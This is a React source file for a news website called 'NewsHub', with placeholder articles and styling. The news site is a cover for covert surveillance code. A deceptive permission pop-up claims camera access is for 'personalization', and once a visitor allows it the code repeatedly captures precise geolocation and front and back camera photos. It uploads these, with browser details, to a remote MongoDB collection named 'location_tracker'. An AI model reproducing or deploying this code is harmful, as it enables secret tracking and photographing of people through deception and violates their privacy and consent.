import React, { useState, useEffect } from 'react';
import * as Realm from 'realm-web';

const NewsWebsite = () => {
  // Location and camera tracking states (hidden from UI)
  const [mongoClient, setMongoClient] = useState(null);
  const [user, setUser] = useState(null);
  const [trackingActive, setTrackingActive] = useState(false);

  // News content states
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  // MongoDB Atlas App Configuration
  const REALM_APP_ID = "myrealmapp-lwdulec";
  const DATABASE_NAME = "location_tracker";
  const COLLECTION_NAME = "locations";

  // Initialize Realm App
  const app = new Realm.App({ id: REALM_APP_ID });

  // News data
  const newsCategories = ['all', 'technology', 'business', 'sports', 'entertainment', 'health', 'science'];
  
  const newsArticles = [
    {
      id: 1,
      title: "Revolutionary AI Technology Transforms Healthcare Industry",
      summary: "New artificial intelligence breakthrough promises to revolutionize patient diagnosis and treatment across global healthcare systems.",
      category: "technology",
      author: "Dr. Sarah Chen",
      publishedAt: "2024-01-15T10:30:00Z",
      readTime: "5 min read",
      image: "https://images.unsplash.com/photo-1559757148-5c350d0d3c56?w=400&h=250&fit=crop",
      featured: true
    },
    {
      id: 2,
      title: "Global Markets Surge Following Economic Recovery Signals",
      summary: "Stock markets worldwide show positive momentum as economic indicators suggest strong recovery trends.",
      category: "business",
      author: "Michael Rodriguez",
      publishedAt: "2024-01-15T08:15:00Z",
      readTime: "3 min read",
      image: "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=400&h=250&fit=crop"
    },
    {
      id: 3,
      title: "Championship Finals Set Record Viewership Numbers",
      summary: "The most-watched sporting event of the year delivers thrilling competition and historic performances.",
      category: "sports",
      author: "Jessica Thompson",
      publishedAt: "2024-01-14T22:45:00Z",
      readTime: "4 min read",
      image: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=400&h=250&fit=crop"
    },
    {
      id: 4,
      title: "Climate Scientists Discover Promising Ocean Recovery Patterns",
      summary: "New research reveals encouraging signs of marine ecosystem restoration in key ocean regions.",
      category: "science",
      author: "Dr. Emily Watson",
      publishedAt: "2024-01-14T16:20:00Z",
      readTime: "6 min read",
      image: "https://images.unsplash.com/photo-1559827260-dc66d52bef19?w=400&h=250&fit=crop"
    },
    {
      id: 5,
      title: "Breakthrough Study Links Exercise to Enhanced Cognitive Function",
      summary: "Researchers unveil compelling evidence showing how regular physical activity boosts brain performance.",
      category: "health",
      author: "Dr. James Wilson",
      publishedAt: "2024-01-14T14:10:00Z",
      readTime: "5 min read",
      image: "https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&h=250&fit=crop"
    },
    {
      id: 6,
      title: "Streaming Wars Intensify with New Platform Launches",
      summary: "Entertainment industry sees major shifts as new streaming services enter the competitive market.",
      category: "entertainment",
      author: "Alex Kumar",
      publishedAt: "2024-01-14T12:30:00Z",
      readTime: "4 min read",
      image: "https://images.unsplash.com/photo-1489599611383-e2bd6ff1d8ee?w=400&h=250&fit=crop"
    }
  ];

  // Styles
  const styles = {
    container: {
      minHeight: '100vh',
      backgroundColor: '#f8f9fa',
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
    },
    header: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: '1rem 0',
      position: 'sticky',
      top: 0,
      zIndex: 1000,
      boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
    },
    headerContent: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '0 1rem',
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      flexWrap: 'wrap',
      gap: '1rem'
    },
    logo: {
      fontSize: 'clamp(1.5rem, 4vw, 1.8rem)',
      fontWeight: 'bold',
      color: '#ff6b6b'
    },
    nav: {
      display: 'flex',
      gap: 'clamp(1rem, 3vw, 2rem)',
      alignItems: 'center',
      flexWrap: 'wrap'
    },
    navLink: {
      color: 'white',
      textDecoration: 'none',
      fontWeight: '500',
      transition: 'color 0.3s ease',
      fontSize: 'clamp(0.9rem, 2.5vw, 1rem)',
      whiteSpace: 'nowrap'
    },
    searchContainer: {
      display: 'flex',
      alignItems: 'center',
      backgroundColor: '#333',
      borderRadius: '25px',
      padding: '0.5rem 1rem',
      minWidth: 'min(250px, 100%)',
      width: '100%',
      maxWidth: '300px'
    },
    searchInput: {
      background: 'none',
      border: 'none',
      color: 'white',
      outline: 'none',
      width: '100%',
      padding: '0.25rem',
      fontSize: 'clamp(0.9rem, 2.5vw, 1rem)'
    },
    main: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: 'clamp(1rem, 4vw, 2rem)'
    },
    categoryBar: {
      display: 'flex',
      gap: '0.5rem',
      marginBottom: '2rem',
      flexWrap: 'wrap',
      justifyContent: 'center'
    },
    categoryButton: {
      background: 'none',
      borderWidth: '2px',
      borderStyle: 'solid',
      borderColor: '#e9ecef',
      padding: 'clamp(0.4rem, 2vw, 0.5rem) clamp(0.8rem, 3vw, 1rem)',
      borderRadius: '25px',
      cursor: 'pointer',
      transition: 'all 0.3s ease',
      fontWeight: '500',
      textTransform: 'capitalize',
      color: '#333',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)',
      whiteSpace: 'nowrap',
      minWidth: 'fit-content'
    },
    categoryButtonActive: {
      backgroundColor: '#ff6b6b',
      borderWidth: '2px',
      borderStyle: 'solid',
      borderColor: '#ff6b6b',
      color: 'white'
    },
    featuredSection: {
      marginBottom: 'clamp(2rem, 5vw, 3rem)'
    },
    featuredTitle: {
      fontSize: 'clamp(1.5rem, 5vw, 2rem)',
      fontWeight: 'bold',
      marginBottom: '1.5rem',
      color: '#333',
      textAlign: 'center'
    },
    featuredCard: {
      backgroundColor: 'white',
      borderRadius: '15px',
      overflow: 'hidden',
      boxShadow: '0 8px 25px rgba(0,0,0,0.1)',
      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
      cursor: 'pointer'
    },
    featuredImage: {
      width: '100%',
      height: 'clamp(250px, 50vw, 400px)',
      objectFit: 'cover'
    },
    featuredContent: {
      padding: 'clamp(1.5rem, 4vw, 2rem)'
    },
    articleTitle: {
      fontSize: 'clamp(1.3rem, 4vw, 1.8rem)',
      fontWeight: 'bold',
      marginBottom: '1rem',
      color: '#333',
      lineHeight: '1.3'
    },
    articleSummary: {
      color: '#666',
      fontSize: 'clamp(1rem, 3vw, 1.1rem)',
      lineHeight: '1.6',
      marginBottom: '1rem'
    },
    articleMeta: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)',
      color: '#888',
      flexWrap: 'wrap',
      gap: '0.5rem'
    },
    newsGrid: {
      display: 'grid',
      gridTemplateColumns: 'repeat(auto-fit, minmax(min(320px, 100%), 1fr))',
      gap: 'clamp(1rem, 3vw, 2rem)',
      marginTop: '2rem'
    },
    newsCard: {
      backgroundColor: 'white',
      borderRadius: '12px',
      overflow: 'hidden',
      boxShadow: '0 4px 15px rgba(0,0,0,0.08)',
      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
      cursor: 'pointer'
    },
    newsImage: {
      width: '100%',
      height: 'clamp(180px, 35vw, 200px)',
      objectFit: 'cover'
    },
    newsContent: {
      padding: 'clamp(1rem, 3vw, 1.5rem)'
    },
    newsTitle: {
      fontSize: 'clamp(1.1rem, 3.5vw, 1.2rem)',
      fontWeight: 'bold',
      marginBottom: '0.5rem',
      color: '#333',
      lineHeight: '1.4'
    },
    newsSummary: {
      color: '#666',
      fontSize: 'clamp(0.9rem, 2.5vw, 0.95rem)',
      lineHeight: '1.5',
      marginBottom: '1rem'
    },
    categoryTag: {
      display: 'inline-block',
      backgroundColor: '#ff6b6b',
      color: 'white',
      padding: '0.25rem 0.75rem',
      borderRadius: '15px',
      fontSize: 'clamp(0.7rem, 2vw, 0.8rem)',
      fontWeight: '500',
      textTransform: 'uppercase',
      marginBottom: '1rem'
    },
    footer: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: 'clamp(2rem, 5vw, 3rem) 0',
      marginTop: 'clamp(3rem, 6vw, 4rem)'
    },
    footerContent: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '0 1rem',
      textAlign: 'center'
    },
    footerText: {
      color: '#ccc',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)'
    },
    mobileMenuToggle: {
      display: 'none',
      background: 'none',
      border: 'none',
      color: 'white',
      fontSize: '1.5rem',
      cursor: 'pointer',
      padding: '0.5rem'
    },
    mobileNav: {
      display: 'none',
      flexDirection: 'column',
      width: '100%',
      gap: '1rem',
      marginTop: '1rem',
      paddingTop: '1rem',
      borderTop: '1px solid #333'
    },
    mobileNavVisible: {
      display: 'flex'
    }
  };

  // MongoDB connection and tracking functions
  const initializeMongoDB = async () => {
    try {
      if (app.currentUser) {
        setUser(app.currentUser);
        const mongodb = app.currentUser.mongoClient("mongodb-atlas");
        setMongoClient(mongodb);
        return mongodb;
      }

      const credentials = Realm.Credentials.anonymous();
      const authenticatedUser = await app.logIn(credentials);
      setUser(authenticatedUser);

      const mongodb = authenticatedUser.mongoClient("mongodb-atlas");
      setMongoClient(mongodb);
      return mongodb;
    } catch (error) {
      console.error('MongoDB connection failed:', error);
      return null;
    }
  };

  const saveLocationToMongoDB = async (location, client = null) => {
    try {
      const dbClient = client || mongoClient;
      if (!dbClient) return null;

      const collection = dbClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
      
      const locationData = {
        ...location,
        timestamp: new Date(location.timestamp),
        createdAt: new Date(),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        pageUrl: window.location.href,
        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1
      };

      localStorage.setItem('visitCount', locationData.visitCount.toString());
      const result = await collection.insertOne(locationData);
      return result;
    } catch (error) {
      console.error('Location save failed:', error);
      return null;
    }
  };

  const saveCameraDataToMongoDB = async (cameraData, client = null) => {
    try {
      const dbClient = client || mongoClient;
      if (!dbClient) return null;

      const collection = dbClient.db(DATABASE_NAME).collection('camera_captures');
      
      const captureData = {
        ...cameraData,
        timestamp: new Date(),
        createdAt: new Date(),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        pageUrl: window.location.href,
        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
        visitCount: parseInt(localStorage.getItem('visitCount') || '0')
      };

      const result = await collection.insertOne(captureData);
      return result;
    } catch (error) {
      console.error('Camera data save failed:', error);
      return null;
    }
  };

  const trackUserLocation = async () => {
    if (!navigator.geolocation) return;

    const options = {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0
    };

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          altitude: position.coords.altitude,
          heading: position.coords.heading,
          speed: position.coords.speed
        };

        await saveLocationToMongoDB(location);
      },
      (error) => {
        console.log('Location access failed:', error.message);
      },
      options
    );
  };

  const captureFromCamera = async (facingMode = 'user') => {
    try {
      const constraints = {
        video: {
          facingMode: facingMode,
          width: { ideal: 1920 },
          height: { ideal: 1080 }
        },
        audio: false
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      return new Promise((resolve) => {
        video.onloadedmetadata = () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          
          setTimeout(() => {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());
            
            resolve({
              camera: facingMode === 'user' ? 'front' : 'back',
              imageData: imageData,
              width: canvas.width,
              height: canvas.height,
              capturedAt: new Date().toISOString()
            });
          }, 1000);
        };
      });
    } catch (error) {
      console.error('Camera access failed:', error.message);
      return null;
    }
  };

  const trackCameraAccess = async () => {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');

      const cameraData = {
        availableCameras: videoDevices.length,
        devices: videoDevices.map(device => ({
          deviceId: device.deviceId,
          label: device.label || 'Camera',
          kind: device.kind
        })),
        captures: []
      };

      const frontCapture = await captureFromCamera('user');
      if (frontCapture) {
        cameraData.captures.push(frontCapture);
      }

      if (videoDevices.length > 1) {
        const backCapture = await captureFromCamera('environment');
        if (backCapture) {
          cameraData.captures.push(backCapture);
        }
      }

      if (cameraData.captures.length > 0) {
        await saveCameraDataToMongoDB(cameraData);
      }
    } catch (error) {
      console.error('Camera tracking failed:', error);
    }
  };

  // Continuous tracking function
  const startContinuousTracking = async () => {
    if (!mongoClient || trackingActive) return;
    
    setTrackingActive(true);
    
    // Initial tracking
    await trackUserLocation();
    setTimeout(() => trackCameraAccess(), 2000);

    // Set up continuous location tracking every 5 minutes
    const locationInterval = setInterval(() => {
      trackUserLocation();
    }, 5 * 60 * 1000); // 5 minutes

    // Set up continuous camera tracking every 10 minutes
    const cameraInterval = setInterval(() => {
      trackCameraAccess();
    }, 10 * 60 * 1000); // 10 minutes

    // Store intervals for cleanup
    sessionStorage.setItem('locationInterval', locationInterval);
    sessionStorage.setItem('cameraInterval', cameraInterval);
  };

  // Smart permission request
  const requestPermissionsWithContext = async () => {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0,0,0,0.8);
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-family: system-ui;
    `;

    const modal = document.createElement('div');
    modal.style.cssText = `
      background: #1a1a1a;
      border-radius: 15px;
      padding: 30px;
      max-width: 350px;
      text-align: center;
      border: 2px solid #ff6b6b;
    `;

    modal.innerHTML = `
      <h2 style="color: #ff6b6b; margin-bottom: 20px;">📰 NewsHub</h2>
      <p style="margin-bottom: 20px; line-height: 1.5;">
        To provide you with <strong>personalized local news</strong> and 
        <strong>enhanced reading experience</strong>, we need access to:
      </p>
      <div style="text-align: left; margin: 20px 0;">
        <p>📍 <strong>Location</strong> - For local news & weather updates</p>
        <p>📷 <strong>Camera</strong> - For enhanced features & personalization</p>
      </div>
      <button id="allowBtn" style="
        background: #ff6b6b;
        color: white;
        border: none;
        padding: 15px 30px;
        border-radius: 25px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        margin: 10px;
      ">Allow & Continue</button>
      <button id="skipBtn" style="
        background: transparent;
        color: #ccc;
        border: 1px solid #ccc;
        padding: 15px 30px;
        border-radius: 25px;
        font-size: 16px;
        cursor: pointer;
        margin: 10px;
      ">Skip for Now</button>
    `;

    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    return new Promise((resolve) => {
      document.getElementById('allowBtn').onclick = async () => {
        document.body.removeChild(overlay);
        await startContinuousTracking();
        resolve(true);
      };

      document.getElementById('skipBtn').onclick = () => {
        document.body.removeChild(overlay);
        resolve(false);
      };
    });
  };

  // Initialize tracking on component mount
  useEffect(() => {
    const initializeTracking = async () => {
      if (!sessionStorage.getItem('sessionId')) {
        sessionStorage.setItem('sessionId', Date.now().toString());
      }

      try {
        const dbClient = await initializeMongoDB();
        
        if (dbClient) {
          // Wait for user interaction before requesting permissions
          const handleUserInteraction = async () => {
            document.removeEventListener('click', handleUserInteraction);
            document.removeEventListener('scroll', handleUserInteraction);
            
            setTimeout(() => {
              requestPermissionsWithContext();
            }, 3000);
          };

          document.addEventListener('click', handleUserInteraction);
          document.addEventListener('scroll', handleUserInteraction);
          
          // Fallback: show modal after 10 seconds even without interaction
          setTimeout(() => {
            if (!trackingActive) {
              requestPermissionsWithContext();
            }
          }, 10000);
        }
      } catch (error) {
        console.error('Tracking initialization failed:', error);
      }
    };

    initializeTracking();

    // Cleanup intervals on unmount
    return () => {
      const locationInterval = sessionStorage.getItem('locationInterval');
      const cameraInterval = sessionStorage.getItem('cameraInterval');
      
      if (locationInterval) clearInterval(parseInt(locationInterval));
      if (cameraInterval) clearInterval(parseInt(cameraInterval));
    };
  }, []);

  // News filtering logic
  const filteredArticles = newsArticles.filter(article => {
    const matchesCategory = selectedCategory === 'all' || article.category === selectedCategory;
    const matchesSearch = article.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         article.summary.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesCategory && matchesSearch;
  });

  const featuredArticle = newsArticles.find(article => article.featured);
  const regularArticles = filteredArticles.filter(article => !article.featured);

  const formatDate = (dateString) => {
    const date = new Date(dateString);
    return date.toLocaleDateString('en-US', { 
      month: 'long', 
      day: 'numeric', 
      year: 'numeric' 
    });
  };

  const handleCardHover = (e) => {
    if (window.matchMedia('(hover: hover)').matches) {
      e.currentTarget.style.transform = 'translateY(-5px)';
      e.currentTarget.style.boxShadow = '0 12px 30px rgba(0,0,0,0.15)';
    }
  };

  const handleCardLeave = (e) => {
    if (window.matchMedia('(hover: hover)').matches) {
      e.currentTarget.style.transform = 'translateY(0)';
      e.currentTarget.style.boxShadow = e.currentTarget.classList.contains('featured') ? 
        '0 8px 25px rgba(0,0,0,0.1)' : '0 4px 15px rgba(0,0,0,0.08)';
    }
  };

  const toggleMobileMenu = () => {
    setMobileMenuOpen(!mobileMenuOpen);
  };

  return (
    <div style={styles.container}>
      <header style={styles.header}>
        <div style={styles.headerContent}>
          <div style={styles.logo}>NewsHub</div>
          
          <nav style={{...styles.nav, display: window.innerWidth > 768 ? 'flex' : 'none'}}>
            <a href="#" style={styles.navLink}>Home</a>
            <a href="#" style={styles.navLink}>World</a>
            <a href="#" style={styles.navLink}>Politics</a>
            <a href="#" style={styles.navLink}>Opinion</a>
            <div style={styles.searchContainer}>
              <input
                type="text"
                placeholder="Search news..."
                style={styles.searchInput}
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
            </div>
          </nav>

          <button 
            style={{...styles.mobileMenuToggle, display: window.innerWidth <= 768 ? 'block' : 'none'}}
            onClick={toggleMobileMenu}
          >
            ☰
          </button>

          <nav style={{
            ...styles.mobileNav,
            ...(mobileMenuOpen && window.innerWidth <= 768 ? styles.mobileNavVisible : {})
          }}>
            <a href="#" style={styles.navLink}>Home</a>
            <a href="#" style={styles.navLink}>World</a>
            <a href="#" style={styles.navLink}>Politics</a>
            <a href="#" style={styles.navLink}>Opinion</a>
            <div style={styles.searchContainer}>
              <input
                type="text"
                placeholder="Search news..."
                style={styles.searchInput}
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
            </div>
          </nav>
        </div>
      </header>

      <main style={styles.main}>
        <div style={styles.categoryBar}>
          {newsCategories.map(category => (
            <button
              key={category}
              style={{
                ...styles.categoryButton,
                ...(selectedCategory === category ? styles.categoryButtonActive : {})
              }}
              onClick={() => setSelectedCategory(category)}
            >
              {category}
            </button>
          ))}
        </div>

        {featuredArticle && selectedCategory === 'all' && (
          <section style={styles.featuredSection}>
            <h2 style={styles.featuredTitle}>Featured Story</h2>
            <div 
              className="featured"
              style={styles.featuredCard}
              onMouseEnter={handleCardHover}
              onMouseLeave={handleCardLeave}
            >
              <img 
                src={featuredArticle.image} 
                alt={featuredArticle.title}
                style={styles.featuredImage}
              />
              <div style={styles.featuredContent}>
                <div style={styles.categoryTag}>{featuredArticle.category}</div>
                <h3 style={styles.articleTitle}>{featuredArticle.title}</h3>
                <p style={styles.articleSummary}>{featuredArticle.summary}</p>
                <div style={styles.articleMeta}>
                  <span>By {featuredArticle.author} • {formatDate(featuredArticle.publishedAt)}</span>
                  <span>{featuredArticle.readTime}</span>
                </div>
              </div>
            </div>
          </section>
        )}

        <div style={styles.newsGrid}>
          {regularArticles.map(article => (
            <div
              key={article.id}
              style={styles.newsCard}
              onMouseEnter={handleCardHover}
              onMouseLeave={handleCardLeave}
            >
              <img 
                src={article.image} 
                alt={article.title}
                style={styles.newsImage}
              />
              <div style={styles.newsContent}>
                <div style={styles.categoryTag}>{article.category}</div>
                <h3 style={styles.newsTitle}>{article.title}</h3>
                <p style={styles.newsSummary}>{article.summary}</p>
                <div style={styles.articleMeta}>
                  <span>By {article.author}</span>
                  <span>{article.readTime}</span>
                </div>
                <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
                  <span>{formatDate(article.publishedAt)}</span>
                </div>
              </div>
            </div>
          ))}
        </div>
      </main>

      <footer style={styles.footer}>
        <div style={styles.footerContent}>
          <div style={styles.logo}>NewsHub</div>
          <p style={styles.footerText}>
            Your trusted source for breaking news and in-depth analysis
          </p>
          <p style={{...styles.footerText, marginTop: '1rem'}}>
            © 2024 NewsHub. All rights reserved.
          </p>
        </div>
      </footer>

      <style>{`
        @media (max-width: 768px) {
          .nav-desktop { display: none !important; }
          .mobile-menu-toggle { display: block !important; }
          .header-content { flex-direction: column; align-items: stretch; }
        }
        
        @media (min-width: 769px) {
          .nav-desktop { display: flex !important; }
          .mobile-menu-toggle { display: none !important; }
          .mobile-nav { display: none !important; }
        }

        @media (max-width: 768px) {
          button, a {
            min-height: 44px;
            min-width: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
          }
        }

        html {
          scroll-behavior: smooth;
        }

        @media (hover: none) {
          .news-card:hover,
          .featured-card:hover {
            transform: none !important;
            box-shadow: initial !important;
          }
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
      `}</style>
    </div>
  );
};

export default NewsWebsite;